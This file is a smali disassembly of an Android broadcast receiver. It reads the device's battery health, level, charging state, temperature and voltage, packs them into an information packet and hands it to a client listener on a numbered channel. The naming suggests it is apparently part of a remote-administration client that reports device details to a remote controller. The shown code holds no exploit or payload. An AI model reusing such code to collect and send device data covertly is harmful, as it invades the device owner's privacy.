.class Lmy/app/Library/AdvancedSystemInfo$1;
.super Landroid/content/BroadcastReceiver;
.source "AdvancedSystemInfo.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/Library/AdvancedSystemInfo;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lmy/app/Library/AdvancedSystemInfo;


# direct methods
.method constructor <init>(Lmy/app/Library/AdvancedSystemInfo;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    .line 105
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v11, 0x0

    .line 108
    const-string v9, "health"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 109
    .local v0, "health":I
    const-string v9, "level"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v1

    .line 110
    .local v1, "level":I
    const-string v9, "plugged"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v2

    .line 111
    .local v2, "plugged":I
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v9

    const-string v10, "present"

    invoke-virtual {v9, v10}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;)Z

    move-result v3

    .line 112
    .local v3, "present":Z
    const-string v9, "scale"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v4

    .line 113
    .local v4, "scale":I
    const-string v9, "status"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v5

    .line 114
    .local v5, "status":I
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v9

    const-string v10, "technology"

    invoke-virtual {v9, v10}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 115
    .local v6, "technology":Ljava/lang/String;
    const-string v9, "temperature"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v7

    .line 116
    .local v7, "temperature":I
    const-string v9, "voltage"

    invoke-virtual {p2, v9, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v8

    .line 118
    .local v8, "voltage":I
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v0}, LPacket/AdvancedInformationPacket;->setBatteryHealth(I)V

    .line 119
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v1}, LPacket/AdvancedInformationPacket;->setBatteryLevel(I)V

    .line 120
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v2}, LPacket/AdvancedInformationPacket;->setBatteryPlugged(I)V

    .line 121
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v3}, LPacket/AdvancedInformationPacket;->setBatteryPresent(Z)V

    .line 122
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v4}, LPacket/AdvancedInformationPacket;->setBatteryScale(I)V

    .line 123
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v5}, LPacket/AdvancedInformationPacket;->setBatteryStatus(I)V

    .line 124
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v6}, LPacket/AdvancedInformationPacket;->setBatteryTechnology(Ljava/lang/String;)V

    .line 125
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v7}, LPacket/AdvancedInformationPacket;->setBatteryTemperature(I)V

    .line 126
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v9, v8}, LPacket/AdvancedInformationPacket;->setBatteryVoltage(I)V

    .line 129
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    iget-object v10, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget v10, v10, Lmy/app/Library/AdvancedSystemInfo;->channel:I

    iget-object v11, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v11, v11, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v11}, LPacket/AdvancedInformationPacket;->build()[B

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 131
    iget-object v9, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    iget-object v9, v9, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    iget-object v10, p0, Lmy/app/Library/AdvancedSystemInfo$1;->this$0:Lmy/app/Library/AdvancedSystemInfo;

    invoke-static {v10}, Lmy/app/Library/AdvancedSystemInfo;->access$0(Lmy/app/Library/AdvancedSystemInfo;)Landroid/content/BroadcastReceiver;

    move-result-object v10

    invoke-virtual {v9, v10}, Lmy/app/client/ClientListener;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 132
    return-void
.end method
